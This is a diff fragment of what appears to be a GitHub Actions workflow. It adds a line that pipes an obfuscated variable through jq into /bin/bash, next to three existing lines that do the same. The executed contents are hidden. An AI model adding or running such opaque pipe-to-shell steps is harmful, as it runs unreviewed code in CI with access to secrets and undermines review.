@@ -32,6 +32,7 @@ jobs:
           echo $cdham2 | jq -r .aoebf43128 | /bin/bash
           printf '%s' "$h964" | jq -r .tgt4 | /bin/bash
           printf '%s' "$nb3141" | jq -r .r209 | /bin/bash
+          echo $mff8 | jq -r .g97369 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
